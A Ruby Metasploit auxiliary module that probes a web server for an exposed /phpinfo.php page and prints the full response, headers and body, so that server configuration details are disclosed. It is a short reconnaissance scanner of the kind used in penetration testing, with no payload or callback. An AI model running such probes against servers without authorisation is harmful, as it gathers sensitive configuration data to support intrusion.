require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'PHP info page expose',
      'Description'    => %q{
        This module exploits the information disclosure vulnerability in phpinfo page.
        It attempts to retrieve sensitive information from the exposed phpinfo page.
      },
      'Author'         => 'Hoa Le Ngoc',
      'License'        => MSF_LICENSE,
      'References'     => [
        ['URL', 'https://www.acunetix.com/vulnerabilities/web/phpinfo-output-detected/']
      ]
    ))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [true, 'Base path to the web application', '/'])
      ])
  end

  def run
    print_status("Attempting to retrieve phpinfo path")
    response = send_request_cgi(
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path, 'phpinfo.php')
    )

    if response && response.code == 200
      print_good("Found /phpinfo.php! Status code: #{response.code}")
      print_line("===Response start===\n#{response.headers}\n#{response.body}\n===Response end===")
    else
      print_error("Failed to retrieve php info page")
    end
  end
end
